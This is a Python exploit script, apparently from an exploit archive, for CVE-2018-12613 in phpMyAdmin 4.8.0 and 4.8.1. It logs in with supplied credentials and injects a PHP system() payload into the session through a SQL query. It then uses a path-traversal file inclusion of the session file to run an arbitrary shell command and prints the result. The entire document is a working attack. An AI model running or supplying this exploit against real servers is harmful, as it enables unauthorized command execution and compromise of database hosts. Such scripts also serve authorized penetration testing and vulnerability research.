# Exploit Title: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
# Date: 17/08/2021
# Exploit Author: samguy
# Vulnerability Discovery By: ChaMd5 & Henry Huang
# Vendor Homepage: http://www.phpmyadmin.net
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
# Version: 4.8.1
# Tested on: Linux - Debian Buster (PHP 7.3)
# CVE : CVE-2018-12613

#!/usr/bin/env python

import re, requests, sys

# Check python version and import HTML parser accordingly
if sys.version_info.major == 3:
    import html
else:
    from six.moves.html_parser import HTMLParser
    html = HTMLParser()

# Check if command line arguments are provided
if len(sys.argv) < 7:
    # Display usage information if arguments are insufficient
    usage = """Usage: {} [ipaddr] [port] [path] [username] [password] [command]
Example: {} 192.168.56.65 8080 /phpmyadmin username password whoami"""
    print(usage.format(sys.argv[0], sys.argv[0]))
    exit()

# Function to extract and unescape the token from HTML content
# with a regular expression
def get_token(content):
    s = re.search('token"\s*value="(.*?)"', content)
    token = html.unescape(s.group(1))
    return token

# Retrieve command line arguments
ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

# Construct the base URL from the arguments provided
url = "http://{}:{}{}".format(ipaddr, port, path)

# 1st req: Check login page and version
url1 = url + "/index.php"
# request for the login page and phpmyadmin version
r = requests.get(url1)
content = r.content.decode('utf-8')
if r.status_code != 200:
    # Display an error if unable to find the version
    print("Unable to find the version")
    exit()

# Extract and check phpmyadmin version
s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)
if version != "4.8.0" and version != "4.8.1":
    # Display an error if the target is not exploitable
    print("The target is not exploitable".format(version))
    exit()

# Get 1st token and cookie
cookies = r.cookies
token = get_token(content)

# 2nd req: Login to phpmyadmin
p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies=cookies, data=p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)
if logged_in == "false":
    # Display an error if authentication fails
    print("Authentication failed")
    exit()

# Get 2nd token and cookie for further requests
cookies = r.cookies
token = get_token(content)

# 3rd req: Execute query
url2 = url + "/import.php"
# Payload for SQL injection
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table': '', 'token': token, 'sql_query': payload}
# Sends a post request to /import.php
r = requests.post(url2, cookies=cookies, data=p)
if r.status_code != 200:
    # Display an error if the SQL query fails
    print("Query failed")
    exit()

# 4th req: Execute payload 
# with obtained session id 
session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_{}".format(session_id)
# get request to execute the exploit
r = requests.get(url3, cookies=cookies)
if r.status_code != 200:
    # Display an error if the exploit fails
    print("Exploit failed")
    exit()

# Get and print result
content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s is not None:
    # Print the result of the exploit
    print(s.group(1))
